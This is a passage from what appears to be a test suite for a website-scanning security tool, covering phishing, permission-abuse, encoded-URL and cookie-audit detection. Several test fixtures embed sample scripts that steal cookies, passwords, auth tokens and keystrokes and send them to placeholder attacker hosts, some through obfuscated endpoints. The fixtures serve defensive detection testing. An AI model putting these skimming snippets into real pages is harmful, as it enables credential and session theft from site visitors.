  const externalJsCode = `
    var box = document.getElementById('root');
    box.innerHTML = '<form action="https://steal.evil/post"><input type="password" name="cvv" /></form>';
    var c = document.cookie;
    fetch('https://steal.evil/exfil', { method: 'POST', body: c });
    setTimeout(function(){ window.location.replace('https://redirect.evil/next'); }, 800);
  `;
  const content = analyzeWebsiteContentAndBrand(url, 200, { 'content-type': 'text/html' }, html, []);
  const source = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html, {
    fetchedScripts: [{ url: 'https://promo-alert.example/assets/loader.js', code: externalJsCode }],
    fetchedCss: [{ url: 'https://promo-alert.example/assets/site.css', css: '@import url("https://assets-cdn.evil/font.css");' }],
  });

  assert.equal(content.data?.waitingOrInterstitialDetected, true);
  assert.ok((content.data?.fakeSupportIndicators?.length || 0) >= 1, 'Expected fake tech support detection');
  assert.equal(source.sourceIntel.externalJsInspectedCount, 1);
  assert.ok((source.sourceIntel.jsDomMutationPayloads?.length || 0) >= 1, 'Expected JS DOM mutation payload signal');
  assert.equal(source.sourceIntel.dynamicContentAfterJsLikely, true);
  assert.ok((source.sourceIntel.brandLookalikeLinks || []).some((l) => l.host === 'paypa1-secure-login.example'));
  assert.ok((source.sourceIntel.cssExternalDomains || []).includes('assets-cdn.evil'));
});

// 44. SPA shell with thin initial HTML flags dynamicContentAfterJsLikely for transparent Level A vs Level B caveat
test('44. Thin SPA shell flags dynamicContentAfterJsLikely without falsely labeling clean SPA as malicious', () => {
  const url = 'https://modern-spa-docs.example/';
  const spaHtml = Buffer.from(
    `<!doctype html><html><head><title>Developer Portal</title></head><body>
     <div id="app"></div><noscript>Please enable JavaScript to view documentation.</noscript>
     <script type="module" src="/assets/index.vendor.min.js"></script>
     </body></html>`,
    'utf8'
  );
  const content = analyzeWebsiteContentAndBrand(url, 200, { 'content-type': 'text/html' }, spaHtml, []);
  const source = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, spaHtml, {
    fetchedScripts: [{ url: 'https://modern-spa-docs.example/assets/index.vendor.min.js', code: 'export const app="ok";'.repeat(80) }],
  });
  const scored = computeRiskAndSections([...content.findings, ...source.findings], mockCleanProviders(), { finalUrl: url });

  assert.equal(source.sourceIntel.dynamicContentAfterJsLikely, true);
  assert.ok(source.sourceIntel.staticVsRenderedNote?.en.length);
  assert.equal(source.sourceIntel.suspiciousCodeSignals.length, 0);
  assert.notEqual(scored.classification, 'HIGH');
  assert.notEqual(scored.classification, 'CRITICAL');
});

// 45. On-entry permission requests & stated-usage mismatch escalate to HIGH; justified click-bound permissions stay safe
test('45. Detects on-entry permission prompts, checks stated-usage consistency, and escalates mismatches to HIGH', () => {
  // Case A: News blog silently requesting camera, geolocation & notifications immediately on entry
  const deceptiveUrl = 'https://daily-tech-recipes.example/article';
  const deceptiveHtml = Buffer.from(
    `<!doctype html><html><head><title>Best Homemade Soup Recipes</title>
     <meta name="description" content="Quick healthy soup recipes and cooking tutorials." /></head>
     <body><h1>Warm Winter Vegetable Soup</h1><p>Chop carrots and onions and simmer for 25 minutes.</p>
     <script src="https://daily-tech-recipes.example/entry-perms.js"></script>
     <script>
       window.onload = function () {
         Notification.requestPermission();
         navigator.geolocation.getCurrentPosition(function(){});
       };
     </script></body></html>`,
    'utf8'
  );
  const externalScript = `
    document.addEventListener('DOMContentLoaded', function () {
      navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    });
  `;
  const content = analyzeWebsiteContentAndBrand(
    deceptiveUrl,
    200,
    { 'content-type': 'text/html' },
    deceptiveHtml,
    [],
    [{ url: 'https://daily-tech-recipes.example/entry-perms.js', code: externalScript }]
  );
  const scored = computeRiskAndSections(content.findings, mockCleanProviders(), { finalUrl: deceptiveUrl });

  assert.ok(content.data?.permissionAudit, 'Expected permissionAudit block to be populated');
  assert.equal(content.data?.permissionAudit?.triggeredOnEntry, true);
  assert.equal(content.data?.permissionAudit?.statedUsageConsistent, false);
  assert.equal(content.data?.permissionAudit?.riskEscalatedToHigh, true);
  assert.equal(content.data?.notificationApiDetected, true);
  assert.ok(content.data?.permissionAudit?.permissions.some((p) => p.id === 'camera_mic'));
  assert.ok(
    scored.classification === 'HIGH' || scored.classification === 'CRITICAL',
    `Expected HIGH/CRITICAL escalation for on-entry mismatched permissions, got ${scored.classification} (${scored.riskScore})`
  );
  assert.ok(scored.riskScore >= 72);

  // Case B: Legitimate video meeting page requesting camera/mic ONLY inside an explicit user click handler
  const meetingUrl = 'https://meet-room.example/join';
  const meetingHtml = Buffer.from(
    `<!doctype html><html><head><title>Video Meeting Studio</title>
     <meta name="description" content="Join your browser video conference call and webcam test." /></head>
     <body><h1>Join Video Conference Room</h1><p>Click Start Camera to preview webcam and microphone.</p>
     <button id="joinBtn">Start Camera Call</button>
     <script>
       document.getElementById('joinBtn').addEventListener('click', function () {
         navigator.mediaDevices.getUserMedia({ video: true, audio: true });
       });
     </script></body></html>`,
    'utf8'
  );
  const meetContent = analyzeWebsiteContentAndBrand(meetingUrl, 200, { 'content-type': 'text/html' }, meetingHtml, []);
  const meetScored = computeRiskAndSections(meetContent.findings, mockCleanProviders(), { finalUrl: meetingUrl });

  assert.equal(meetContent.data?.permissionAudit?.triggeredOnEntry, false);
  assert.equal(meetContent.data?.permissionAudit?.statedUsageConsistent, true);
  assert.equal(meetContent.data?.permissionAudit?.riskEscalatedToHigh, false);
  assert.notEqual(meetScored.classification, 'HIGH');
  assert.notEqual(meetScored.classification, 'CRITICAL');
});

// 46. Browser document navigation to protected/existing files returns styled 403/404 ErrorView HTML without leaking files
test('46. Browser HTML navigation to protected project files and missing paths renders ErrorView HTML with real 403/404 statuses', async () => {
  const app = await createApp({ enableVite: true, viteHmr: false });
  const srv = http.createServer(app);
  await new Promise<void>((resolve) => srv.listen(0, '127.0.0.1', resolve));
  const addr = srv.address() as { port: number };
  const base = `http://127.0.0.1:${addr.port}`;

  try {
    for (const filePath of ['/package.json', '/server.ts', '/.env', '/docs/API.md', '/src/App.tsx']) {
      const res = await fetch(`${base}${filePath}`, {
        headers: { Accept: 'text/html,application/xhtml+xml', 'Sec-Fetch-Dest': 'document' },
      });
      assert.equal(res.status, 403, `Expected HTTP 403 HTML for browser access to ${filePath}, got ${res.status}`);
      const ctype = res.headers.get('content-type') || '';
      assert.ok(ctype.includes('text/html'), `Expected text/html for ${filePath}, got ${ctype}`);
      const html = await res.text();
      assert.ok(html.includes('<meta name="scanlink-error-code" content="403" />'), `Missing 403 error meta tag for ${filePath}`);
      assert.ok(!html.includes('"dependencies"'), `Must never leak package.json contents on ${filePath}`);
    }

    const missingFileRes = await fetch(`${base}/nonexistent-report.txt`, {
      headers: { Accept: 'text/html', 'Sec-Fetch-Dest': 'document' },
    });
    assert.equal(missingFileRes.status, 404);
    const missingHtml = await missingFileRes.text();
    assert.ok(missingHtml.includes('<meta name="scanlink-error-code" content="404" />'));
  } finally {
    await new Promise<void>((resolve, reject) => srv.close((err) => (err ? reject(err) : resolve())));
    await app.locals.viteServer?.close?.();
  }
});

// 47. Encrypted & encoded URL paths (Base64 path, Hex path, OpenSSL ciphertext, double %25 encoding) + Arabic UTF-8 non-FP
test('47. Detects encrypted/encoded URL paths with decoded previews while preserving clean Arabic UTF-8 URLs', () => {
  // Base64 path + Hex path + OpenSSL Salted AES query + double percent path
  const b64Path = Buffer.from('/secure/login-verify').toString('base64url');
  const hexPath = Buffer.from('https://drop.evil/gate').toString('hex');
  const encUrl = `https://opaque-gate.example/%2561%2564%256d%2569%256e/${b64Path}/${hexPath}?payload=U2FsdGVkX19vW8xK3mP2qR9zL4nT7vB1wA==`;

  const res = analyzeUrlIntelligence(encUrl, encUrl);
  assert.equal(res.encryptionTelemetry.hasEncryptedOrEncodedParts, true);
  assert.ok(res.encryptionTelemetry.encodedPathSegmentCount >= 3, `Expected >=3 encoded path segments, got ${res.encryptionTelemetry.encodedPathSegmentCount}`);
  assert.equal(res.encryptionTelemetry.doublePercentEncoded, true);
  assert.ok(res.encryptionTelemetry.segments.some((s) => s.technique === 'base64' && s.decodedPreview?.includes('/secure/login-verify')));
  assert.ok(res.encryptionTelemetry.segments.some((s) => s.technique === 'hex_encoded' && s.decodedPreview?.includes('https://drop.evil/gate')));
  assert.ok(res.encryptionTelemetry.segments.some((s) => s.technique === 'high_entropy_cipher'));
  assert.equal(res.findings.find((f) => f.id === 'url-encoding-obfuscation')?.status, 'failed');

  // Arabic UTF-8 path (browser percent-encoded) must NOT false-positive as ASCII obfuscation
  const arabicUrl = 'https://news-portal.example/%D8%A3%D8%AE%D8%A8%D8%A7%D8%B1/%D8%A7%D9%84%D8%AA%D9%82%D9%86%D9%8A%D8%A9';
  const arabicRes = analyzeUrlIntelligence(arabicUrl, arabicUrl);
  assert.equal(arabicRes.encryptionTelemetry.hasEncryptedOrEncodedParts, false);
  assert.equal(arabicRes.findings.find((f) => f.id === 'url-encoding-obfuscation')?.status, 'pass');
});

// 48. Background JS data collection + obfuscated external service transmission triggers detailed telemetry & HIGH/CRITICAL risk
test('48. Extracts detailed JS background harvesting and obfuscated external exfiltration endpoints', () => {
  const url = 'https://stealth-portal.example/U2FsdGVkX19xYzAbCdEfGhIjKlMnOpQrSt==';
  const encodedExfil = Buffer.from('https://collector-drop.evil/api/ingest').toString('base64');
  const html = Buffer.from(
    `<!doctype html><html><head><title>Portal</title></head><body>
     <h1>Loading...</h1>
     <script>
       var ep = atob("${encodedExfil}");
       var _c = document.cookie + '|' + localStorage.getItem('auth_token');
       var canvas = document.createElement('canvas');
       var fp = canvas.toDataURL();
       document.addEventListener('keydown', function(e) {
         fetch(ep, { method: 'POST', body: _c + fp + e.key });
       });
       setInterval(function() {
         navigator.sendBeacon('https://beacon-sink.evil/ping', _c);
       }, 4000);
       var ws = new WebSocket('wss://stream-relay.evil/ws');
     </script></body></html>`,
    'utf8'
  );

  const urlRes = analyzeUrlIntelligence(url, url);
  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html);
  const scored = computeRiskAndSections([...urlRes.findings, ...sourceRes.findings], mockCleanProviders(), { finalUrl: url });

  const bg = sourceRes.sourceIntel.backgroundDataCollection || [];
  const tx = sourceRes.sourceIntel.externalDataTransmissions || [];

  assert.ok(bg.some((b) => b.category === 'cookies_storage' && b.apisUsed.includes('document.cookie')));
  assert.ok(bg.some((b) => b.category === 'browser_fingerprinting'));
  assert.ok(bg.some((b) => b.category === 'keystrokes_clipboard'));
  assert.ok(bg.some((b) => b.category === 'background_polling'));

  const fetchTx = tx.find((t) => t.method === 'fetch');
  assert.ok(fetchTx, 'Expected decoded fetch endpoint');
  assert.equal(fetchTx.destinationUrl, 'https://collector-drop.evil/api/ingest');
  assert.equal(fetchTx.destinationHost, 'collector-drop.evil');
  assert.equal(fetchTx.obfuscatedUrl, true);
  assert.equal(fetchTx.relationshipStatus, 'external_unknown');
  assert.equal(fetchTx.pairedWithBackgroundCollection, true);

  assert.ok(tx.some((t) => t.method === 'sendBeacon' && t.destinationHost === 'beacon-sink.evil'));
  assert.ok(tx.some((t) => t.method === 'websocket' && t.destinationHost === 'stream-relay.evil'));

  const bgFinding = sourceRes.findings.find((f) => f.id === 'source-background-exfiltration');
  assert.equal(bgFinding?.status, 'failed');
  assert.ok(
    scored.classification === 'HIGH' || scored.classification === 'CRITICAL',
    `Expected HIGH or CRITICAL for encrypted URL + background exfiltration, got ${scored.classification} (${scored.riskScore})`
  );
  assert.ok(scored.riskScore >= 76);
});

// 49. Benign site with same-origin fetch & clean paths stays safe without false positive
test('49. Benign site using same-origin fetch() without secret harvesting remains NO_KNOWN_THREATS', () => {
  const url = 'https://clean-library.example/articles/cyber-hygiene';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Cyber Hygiene Guide</title></head><body>
     <h1>Security Best Practices</h1>
     <script>fetch('/api/articles.json').then(r => r.json());</script>
     </body></html>`,
    'utf8'
  );
  const urlRes = analyzeUrlIntelligence(url, url);
  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html);
  const scored = computeRiskAndSections([...urlRes.findings, ...sourceRes.findings], mockCleanProviders(), { finalUrl: url });

  assert.equal(urlRes.encryptionTelemetry.hasEncryptedOrEncodedParts, false);
  assert.equal(sourceRes.sourceIntel.backgroundDataCollection?.length, 0);
  assert.equal(sourceRes.sourceIntel.externalDataTransmissions?.[0]?.isThirdParty, false);
  assert.equal(sourceRes.sourceIntel.externalDataTransmissions?.[0]?.relationshipStatus, 'same_organization');
  assert.equal(scored.classification, 'NO_KNOWN_THREATS');
  assert.equal(scored.riskScore, 0);
});

// 50. External transmission distinguishes benign analytics/error telemetry from malicious credential/cookie exfiltration
test('50. Classifies transmitted payload data types and separates harmless telemetry from malicious exfiltration', () => {
  // Case A: Harmless analytics & performance error telemetry sent to third-party endpoint
  const benignUrl = 'https://clean-app.example/dashboard';
  const benignHtml = Buffer.from(
    `<!doctype html><html><head><title>App</title></head><body>
     <h1>App Dashboard</h1>
     <script>
       var metrics = { pageView: 1, loadTime: 240, error: null, lang: 'ar' };
       navigator.sendBeacon('https://metrics-collector.example/v1/events', JSON.stringify(metrics));
     </script></body></html>`,
    'utf8'
  );
  const benignSource = analyzeSourceIntelligence(benignUrl, { 'content-type': 'text/html' }, benignHtml);
  const benignTx = benignSource.sourceIntel.externalDataTransmissions?.[0];
  assert.ok(benignTx, 'Expected benign external telemetry item');
  assert.equal(benignTx.harmClassification, 'benign_functional');
  assert.equal(benignTx.isHarmful, false);
  assert.ok(
    benignTx.transmittedDataTypes.includes('analytics_metrics') || benignTx.transmittedDataTypes.includes('error_telemetry'),
    `Expected analytics/error data type, got ${benignTx.transmittedDataTypes.join(',')}`
  );
  assert.equal(benignSource.findings.find((f) => f.id === 'source-background-exfiltration')?.status, 'pass');

  const benignScored = computeRiskAndSections(benignSource.findings, mockCleanProviders(), { finalUrl: benignUrl });
  assert.equal(benignScored.classification, 'NO_KNOWN_THREATS');

  // Case B: Malicious password/cookie/keystroke transmission to external endpoint
  const evilUrl = 'https://bad-login.example/signin';
  const evilHtml = Buffer.from(
    `<!doctype html><html><head><title>Login</title></head><body>
     <form><input type="password" id="pwd" /></form>
     <script>
       var payload = { password: document.getElementById('pwd').value, cookie: document.cookie };
       fetch('https://exfil-sink.evil/steal', { method: 'POST', body: JSON.stringify(payload) });
     </script></body></html>`,
    'utf8'
  );
  const evilSource = analyzeSourceIntelligence(evilUrl, { 'content-type': 'text/html' }, evilHtml);
  const evilTx = evilSource.sourceIntel.externalDataTransmissions?.[0];
  assert.ok(evilTx);
  assert.equal(evilTx.harmClassification, 'malicious_harmful');
  assert.equal(evilTx.isHarmful, true);
  assert.ok(evilTx.transmittedDataTypes.includes('credentials'));
  assert.ok(evilTx.transmittedDataTypes.includes('cookies'));
  assert.equal(evilSource.findings.find((f) => f.id === 'source-background-exfiltration')?.status, 'failed');
});

// 51. Cookie Audit detects advertising/retargeting cookies, hidden ad cookie-stuffing, and malicious JS cookie abuse
test('51. Audits HTTP & JS cookies for advertising trackers, hidden cookie-stuffing, and malicious cookie abuse', () => {
  const url = 'https://ad-abuse-site.example/offer';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Special Offer</title></head><body>
     <h1>Welcome</h1>
     <img src="https://ads.doubleclick.net/pixel?affid=991&subid=abc" width="1" height="1" style="display:none" />
     <script>
       document.cookie = "_fbp=fb.1.1700000000.123456; path=/";
       document.cookie = "popunder_payload=" + atob("YWJjMTIz");
       var leaked = document.cookie;
       fetch('https://cookie-stealer.evil/log', { method: 'POST', body: leaked });
     </script></body></html>`,
    'utf8'
  );
  const rawSetCookies = [
    'session_id=xyz123; Path=/; SameSite=Lax', // missing HttpOnly & Secure while cookie exfil occurs!
    'IDE=AHWqTUm1234; Domain=ad-abuse-site.example; Path=/; Secure',
  ];

  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html, undefined, rawSetCookies);
  const audit = sourceRes.sourceIntel.cookieAudit;
  assert.ok(audit, 'Expected cookieAudit summary');
  assert.equal(audit.setsAdvertisingCookies, true);
  assert.ok(audit.adCookieCount >= 2, `Expected >=2 ad cookies (_fbp & IDE), got ${audit.adCookieCount}`);
  assert.equal(audit.hasMaliciousCookieBehavior, true);
  assert.ok(audit.cookieStuffingSignals.length >= 1, 'Expected hidden doubleclick pixel cookie-stuffing signal');
  assert.ok(audit.cookiesDetected.some((c) => c.name === 'session_id' && c.isMaliciousOrHarmful));
  assert.ok(audit.cookiesDetected.some((c) => c.name === 'popunder_payload' && c.isMaliciousOrHarmful));

  const cookieFinding = sourceRes.findings.find((f) => f.id === 'source-cookie-audit');
  assert.equal(cookieFinding?.status, 'failed');

  const scored = computeRiskAndSections(sourceRes.findings, mockCleanProviders(), { finalUrl: url });
  assert.ok(scored.classification === 'HIGH' || scored.classification === 'CRITICAL');
});

// 52. Clean hardened HTTP session cookie without ad trackers or abuse passes cleanly
test('52. Clean hardened HttpOnly/Secure/SameSite session cookie passes cookie audit with zero risk escalation', () => {
  const url = 'https://clean-portal.example/account';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Account</title></head><body><h1>Account</h1></body></html>`,
    'utf8'
  );
  const rawSetCookies = ['__Host-session=securetoken; Path=/; HttpOnly; Secure; SameSite=Strict'];

  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html, undefined, rawSetCookies);
  const audit = sourceRes.sourceIntel.cookieAudit;
  assert.ok(audit);
  assert.equal(audit.setsAdvertisingCookies, false);
  assert.equal(audit.hasMaliciousCookieBehavior, false);
  assert.equal(audit.cookiesDetected[0]?.category, 'security_cookie');
  assert.equal(sourceRes.findings.find((f) => f.id === 'source-cookie-audit')?.status, 'pass');

  const scored = computeRiskAndSections(sourceRes.findings, mockCleanProviders(), { finalUrl: url });
  assert.equal(scored.classification, 'NO_KNOWN_THREATS');
  assert.equal(scored.riskScore, 0);
});

// 53. Declared essential & functional cookies with user consent banner pass audit with zero rating penalty (safe website)
test('53. Declared essential & functional cookies with user consent banner pass audit with zero rating penalty', () => {
  const url = 'https://portal-store.example/shop';
  const html = Buffer.from(
    `<!doctype html>
    <html lang="ar" dir="rtl">
    <head><title>متجر تجريبي متكامل</title></head>
    <body>
      <div id="cookie-banner" class="cookie-consent-bar">
        <p>نحن نستخدم ملفات تعريف الارتباط لتحسين تجربتك على الموقع وتخصيص المحتوى واللغة.</p>
        <button id="accept-cookies">قبول الكوكيز ومتابعة التصفح</button>
      </div>
      <h1>مرحباً بك في المتجر</h1>
      <script>
        // Legitimate functional state checks and benign external fetch (e.g. weather / currency)
        if (document.cookie.includes('theme=dark')) {
          document.body.classList.add('dark');
        }
        fetch('https://api.external-weather.example/current');
      </script>
    </body>
    </html>`,
    'utf8'
  );
  const rawSetCookies = [
    'session_id=usr_session_12345; Path=/; Secure; SameSite=Lax',
    'theme=dark; Path=/',
    'lang=ar; Path=/',
    'cookie_consent=accepted; Path=/; Secure',
    'cart_id=cart_8971; Path=/; Secure',
  ];

  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html, undefined, rawSetCookies);
  const audit = sourceRes.sourceIntel.cookieAudit;
  assert.ok(audit, 'Expected cookieAudit');
  assert.equal(audit.hasConsentNoticeOrBanner, true, 'Expected cookie consent notice to be detected');
  assert.ok(audit.essentialFunctionalCount >= 4, `Expected >=4 essential cookies, got ${audit.essentialFunctionalCount}`);
  assert.equal(audit.hasMaliciousCookieBehavior, false, 'Expected no malicious cookie behavior');

  const cookieFinding = sourceRes.findings.find((f) => f.id === 'source-cookie-audit');
  assert.ok(cookieFinding, 'Expected source-cookie-audit finding');
  assert.equal(cookieFinding.status, 'pass', 'Expected pass status for declared functional cookies');
  assert.equal(cookieFinding.weight, 0, 'Zero weight penalty for essential cookies (متتحسبش من التقييم)');

  // Verify that the site remains SAFE (NO_KNOWN_THREATS, riskScore 0)
  const scored = computeRiskAndSections(sourceRes.findings, mockCleanProviders(), { finalUrl: url });
  assert.equal(scored.riskScore, 0, 'Risk score must be 0 (no penalty)');
  assert.equal(scored.classification, 'NO_KNOWN_THREATS', 'Site must remain SAFE/NO_KNOWN_THREATS');
});

// 54. Undeclared illegal cookie theft or malicious payload injection fails audit and escalates to HIGH/CRITICAL
test('54. Undeclared illegal cookie theft or malicious payload injection fails audit and escalates to HIGH/CRITICAL', () => {
  const url = 'https://rogue-skimmer.example/login';
  const html = Buffer.from(
    `<!doctype html>
    <html>
    <head><title>Sign In</title></head>
    <body>
      <h1>Sign In</h1>
      <script>
        // Undeclared illegal exfiltration: reading document.cookie and sending it secretly to an untrusted external server
        fetch('https://c2-collector.evil.example/steal', {
          method: 'POST',
          body: 'cookies=' + document.cookie
        });
      </script>
    </body>
    </html>`,
    'utf8'
  );

  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html);
  const audit = sourceRes.sourceIntel.cookieAudit;
  assert.ok(audit);
  assert.equal(audit.hasConsentNoticeOrBanner, false, 'Expected no consent banner');
  assert.equal(audit.hasMaliciousCookieBehavior, true, 'Expected malicious cookie behavior');

  const cookieFinding = sourceRes.findings.find((f) => f.id === 'source-cookie-audit');
  assert.ok(cookieFinding);
  assert.equal(cookieFinding.status, 'failed', 'Expected failed status for undeclared cookie theft');
  assert.ok(cookieFinding.weight > 0, 'Expected positive weight penalty for malicious cookie theft');

  const scored = computeRiskAndSections(sourceRes.findings, mockCleanProviders(), { finalUrl: url });
  assert.ok(scored.classification === 'HIGH' || scored.classification === 'CRITICAL');
});

// 55. Clean website with essential cookies and zero malicious indicators -> NO_KNOWN_THREATS, score 0
test('55. Clean site with essential cookies and zero malicious threats classifies NO_KNOWN_THREATS with score 0', () => {
  const url = 'https://clean-docs.example/';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Documentation</title></head><body><h1>Docs</h1></body></html>`,
    'utf8'
  );
  const rawSetCookies = [
    'csrftoken=abc123; Path=/; Secure; SameSite=Lax',
    'lang=en; Path=/; Secure',
  ];
  const contentRes = analyzeWebsiteContentAndBrand(url, 200, { 'content-type': 'text/html' }, html);
  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html, undefined, rawSetCookies);
  const scored = computeRiskAndSections([...contentRes.findings, ...sourceRes.findings], mockCleanProviders(), {
    finalUrl: url,
  });
  assert.equal(scored.riskScore, 0);
  assert.equal(scored.classification, 'NO_KNOWN_THREATS');
});

// 56. Essential cookies without a cookie consent banner must NOT trigger a penalty
test('56. Essential cookies without a cookie consent banner cause zero penalty', () => {
  const url = 'https://minimal-app.example/dashboard';
  const html = Buffer.from(`<!doctype html><html><head><title>App</title></head><body>Dashboard</body></html>`, 'utf8');
  const rawSetCookies = ['session_id=s123; Path=/; HttpOnly; Secure; SameSite=Lax', 'theme=dark; Path=/'];
  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html, undefined, rawSetCookies);
  const audit = sourceRes.sourceIntel.cookieAudit;
  assert.ok(audit);
  assert.equal(audit.hasConsentNoticeOrBanner, false);
  assert.equal(audit.hasMaliciousCookieBehavior, false);
  assert.equal(audit.consentVerification?.privacyViolationDetected, false);
  const cookieFinding = sourceRes.findings.find((f) => f.id === 'source-cookie-audit');
  assert.equal(cookieFinding?.status, 'pass');
  assert.equal(cookieFinding?.weight, 0);
  const scored = computeRiskAndSections(sourceRes.findings, mockCleanProviders(), { finalUrl: url });
  assert.equal(scored.riskScore, 0);
});

// 57. AST document.cookie read/parse/decodeURIComponent without exfiltration -> score 0
test('57. Benign document.cookie read, parse, and decodeURIComponent without exfiltration yields score 0', () => {
  const url = 'https://spa-prefs.example/settings';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Settings</title></head><body>
      <script>
        function getCookieValue(key) {
          const pairs = document.cookie.split(';');
          for (const item of pairs) {
            const [k, v] = item.trim().split('=');
            if (k === key) return decodeURIComponent(v || '');
          }
          return null;
        }
        getCookieValue('theme');
      </script>
    </body></html>`,
    'utf8'
  );
  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html);
  const ast = analyzeScriptsWithAst([
    { source: 'inline-1', code: html.toString('utf8').match(/<script>([\s\S]*)<\/script>/)![1] },
  ]);
  assert.ok(
    ast.cookieEvents.some((ev) =>
      ev.operations.some((op) => op === 'read' || op === 'parse' || op === 'decode')
    )
  );
  assert.ok(!ast.cookieEvents.some((ev) => ev.operations.includes('theft')));
  const scored = computeRiskAndSections(sourceRes.findings, mockCleanProviders(), { finalUrl: url });
  assert.equal(scored.riskScore, 0);
  assert.equal(scored.classification, 'NO_KNOWN_THREATS');
});

// 58. localStorage + same-origin or benign functional fetch -> score 0
test('58. localStorage usage paired with benign same-origin API fetch yields score 0', () => {
  const url = 'https://notes-app.example/';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Notes</title></head><body>
      <script>
        const prefs = localStorage.getItem('editor_theme') || 'dark';
        fetch('/api/preferences?theme=' + encodeURIComponent(prefs));
      </script>
    </body></html>`,
    'utf8'
  );
  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html);
  assert.equal(sourceRes.sourceIntel.externalDataTransmissions?.some((t) => t.isHarmful), false);
  const scored = computeRiskAndSections(sourceRes.findings, mockCleanProviders(), { finalUrl: url });
  assert.equal(scored.riskScore, 0);
  assert.equal(scored.classification, 'NO_KNOWN_THREATS');
});

// 59. setInterval + benign UI status polling fetch -> score 0
test('59. setInterval UI status polling without sensitive taint yields score 0', () => {
  const url = 'https://status.example/';
  const html = Buffer.from(
    `<!doctype html><html><head><title>System Status</title></head><body>
      <script>
        setInterval(() => {
          fetch('https://status.example/api/health').then((r) => r.json());
        }, 10000);
      </script>
    </body></html>`,
    'utf8'
  );
  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html);
  const exfilFinding = sourceRes.findings.find((f) => f.id === 'source-background-exfiltration');
  assert.equal(exfilFinding?.status, 'pass');
  assert.equal(exfilFinding?.weight, 0);
  const scored = computeRiskAndSections(sourceRes.findings, mockCleanProviders(), { finalUrl: url });
  assert.equal(scored.riskScore, 0);
});

// 60. Analytics (_ga, _gid) vs Advertising (_fbp, IDE) cookie separation accuracy
test('60. Analytics cookies (_ga, _gid) and Advertising cookies (_fbp, IDE) classify into distinct canonical categories', () => {
  const url = 'https://media-blog.example/';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Blog</title></head><body>
      <div id="cookie-consent">
        <p>We use cookies for analytics and personalized ads.</p>
        <button>Accept All</button>
        <button>Reject All</button>
      </div>
    </body></html>`,
    'utf8'
  );
  const rawSetCookies = [
    '_ga=GA1.2.12345; Path=/; Secure',
    '_gid=GA1.2.67890; Path=/; Secure',
    '_fbp=fb.1.12345.67890; Path=/; Secure',
    'IDE=AHWqTUm1234; Domain=.doubleclick.net; Path=/; Secure',
  ];
  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html, undefined, rawSetCookies);
  const audit = sourceRes.sourceIntel.cookieAudit;
  assert.ok(audit);
  const ga = audit.cookiesDetected.find((c) => c.name === '_ga');
  const gid = audit.cookiesDetected.find((c) => c.name === '_gid');
  const fbp = audit.cookiesDetected.find((c) => c.name === '_fbp');
  const ide = audit.cookiesDetected.find((c) => c.name === 'IDE');
  assert.equal(ga?.category, 'analytics');
  assert.equal(gid?.category, 'analytics');
  assert.equal(fbp?.category, 'advertising');
  assert.equal(ide?.category, 'advertising');
  assert.equal(audit.analyticsCookieCount, 2);
  assert.equal(audit.adCookieCount, 2);
  assert.equal(audit.hasMaliciousCookieBehavior, false);
});

// 61. Undeclared pre-consent ad/analytics tracking -> Privacy Violation (warning, low, weight 0), NEVER Malicious
test('61. Pre-consent undeclared analytics/ad tracking triggers Privacy Violation (weight 0), NEVER Malicious', () => {
  const url = 'https://storefront-no-banner.example/';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Store</title>
      <script src="https://www.googletagmanager.com/gtag/js?id=G-12345"></script>
    </head><body><p>Welcome</p></body></html>`,
    'utf8'
  );
  const rawSetCookies = ['_fbp=fb.1.111.222; Path=/', '_ga=GA1.1.333.444; Path=/'];
  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html, undefined, rawSetCookies);
  const audit = sourceRes.sourceIntel.cookieAudit;
  const adIntel = sourceRes.sourceIntel.advertisingIntel;
  assert.ok(audit);
  assert.ok(adIntel);
  assert.equal(audit.hasMaliciousCookieBehavior, false);
  assert.equal(audit.consentVerification?.privacyViolationDetected, true);
  assert.equal(adIntel.status, 'undeclared_tracking');

  const cookieFinding = sourceRes.findings.find((f) => f.id === 'source-cookie-audit');
  const adFinding = sourceRes.findings.find((f) => f.id === 'source-advertising-audit');
  assert.equal(cookieFinding?.status, 'warning');
  assert.equal(cookieFinding?.weight, 0);
  assert.notEqual(cookieFinding?.severity, 'high');
  assert.notEqual(cookieFinding?.severity, 'critical');
  assert.equal(adFinding?.weight, 0);

  const scored = computeRiskAndSections(sourceRes.findings, mockCleanProviders(), { finalUrl: url });
  assert.equal(scored.riskScore, 0);
  assert.equal(scored.classification, 'NO_KNOWN_THREATS');
});

// 62. AST-proven document.cookie exfiltration to external server -> malicious cookie & HIGH/CRITICAL
test('62. AST-proven document.cookie taint flow to external fetch endpoint marks cookie malicious and elevates risk', () => {
  const url = 'https://victim-portal.example/account';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Account</title></head><body>
      <script>
        const stolen = encodeURIComponent(document.cookie);
        navigator.sendBeacon('https://drop.evil-collector.example/ingest', stolen);
      </script>
    </body></html>`,
    'utf8'
  );
  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html, undefined, [
    'auth_session=secret123; Path=/',
  ]);
  const audit = sourceRes.sourceIntel.cookieAudit;
  assert.ok(audit);
